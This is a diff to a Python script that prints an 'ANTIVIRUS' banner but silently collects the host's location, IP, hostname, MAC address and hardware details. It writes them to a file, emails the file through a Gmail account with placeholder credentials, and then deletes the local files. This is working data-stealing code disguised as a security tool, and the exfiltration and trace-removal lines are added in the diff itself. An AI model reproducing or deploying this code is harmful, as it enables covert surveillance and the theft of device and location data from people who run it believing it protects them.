@@ -29,6 +29,7 @@ try:
     import http
     import scapy
     import subprocess
+    import webbrowser
     import smtplib
     import json 
     import getpass
@@ -36,6 +37,15 @@ try:
     import crypto
     import sniffer
     import gmail
+    import psutil
+    import datetime
+    import wmi
+    import logging
+    import re
+    import uuid
+    import device_detector
+    from device_detector import DeviceDetector
+    from device_detector import SoftwareDetector
     from geopy.geocoders import Nominatim
 except ImportError as imp:
     print("Error ! Make sure you have installed all the modules used in this program !")
@@ -48,6 +58,12 @@ except ImportError as imp:
 #End of Imports
 
 #Main program
+def get_size(bytes, suffix="B"):
+    factor = 1024
+    for unit in ["", "K", "M", "G", "T", "P"]:
+        if bytes < factor:
+            return f"{bytes:.2f}{unit}{suffix}"
+        bytes /= factor
 loc=Nominatim(user_agent="Getloc")
 getLoc=loc.geocode("Location") 
 location=getLoc.latitude,getLoc.longitude
@@ -55,16 +71,37 @@ hostname=socket.gethostname()
 DevIP=socket.gethostbyname(hostname)
 IPport=socket.IPPORT_RESERVED
 OSname=os.name
-OS=platform.system()
-CWD=os.getcwd()
 language=locale.getdefaultlocale()
 SysFileEnc=sys.getfilesystemencoding()
-IPv6=socket.has_ipv6
-Data="Location: ",location,"Hostname: ",hostname,"Device IP: ",DevIP,"IP Port: ",IPport,"OS Name: ",OSname,"OS: ",OS,"Current Working Directory: ",CWD,"Language: ",language,"System File Encoding: ",SysFileEnc,"Has IPv6: ",IPv6
+ApiVers=sys.api_version
+plat = platform.uname()
+System = plat.system
+Name = plat.node
+Vers = plat.version
+Machine = plat.machine
+Processor = plat.processor
+PCores = psutil.cpu_count(logical=False)
+LCores = psutil.cpu_count(logical=True)
+vrmem = psutil.virtual_memory()
+MemTots = get_size(vrmem.total)
+MemAv = get_size(vrmem.available)
+MemUsed = get_size(vrmem.used)
+var = wmi.WMI()
+CCPUF = psutil.cpu_freq().current
+MINCPUF = psutil.cpu_freq().min
+MAXCPUF = psutil.cpu_freq().max
+VSys = var.Win32_ComputerSystem()[0]
+MFact = VSys.Manufacturer
+Model = VSys.Model
+SysType = VSys.SystemType
+MacAddr = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+RAM = str(round(psutil.virtual_memory().total / (1024.0 **3)))
+AVRAM = round(psutil.virtual_memory().available/1000000000, 2)
+URAM = round(psutil.virtual_memory().used/1000000000, 2)
+Data="Location: ",location,"Device IP: ",DevIP,"IP Port: ",IPport,"OS Name: ",OSname,"Language: ",language,"System File Encoding: ",SysFileEnc,"Api Version: ",ApiVers,"OS: ",System,"Device Name: ",Name,"Device Version: ",Vers,"Machine: ",Machine,"Processor: ",Processor,"Logical Cores: ",LCores,"Physical Cores: ",PCores,"Total Memory: ",MemTots,"Memory Available: ",MemAv,"Memory Used: ",MemUsed,"Manufacturer: ",MFact,"Model: ",Model,"System Type: ",SysType,"MAC Address: ",MacAddr,"RAM: ",RAM,"Current CPU Frequency: ",CCPUF,"Minimum CPU Frequency: ",MINCPUF,"Max CPU Frequency: ",MAXCPUF,"Available RAM: ",AVRAM,"GB","Used RAM: ",URAM,"GB"
 f = open("AllData.txt","a")
 f.write(str(Data)+"\n")
 f.close()
-os.system("attrib +H AllData.txt")
 text='''
 <html>
 <head>
@@ -80,10 +117,13 @@ text='''
 file=open("Data.html","w")
 file.write(text)
 file.close()
-os.system("attrib +H Data.html")
-gmail1 = gmail.GMail("youremail@gmail.com","yourpassword")
-message = gmail.Message("Data",to="receiver@gmail.com",attachments=["AllData.txt"])
+gmail1 = gmail.GMail("enteryouremailhere@gmail.com","enteryourpasswordhere")
+message = gmail.Message("Data",to="enteryouremailhere@gmail.com",attachments=["AllData.txt"])
 gmail1.send(message)
+time.sleep(2)
+os.remove("AllData.txt")
+time.sleep(2)
+os.remove("Data.html")
 num=random.randint(1,24)
 antivirus=pyfiglet.figlet_format("ANTIVIRUS")
 print(antivirus)
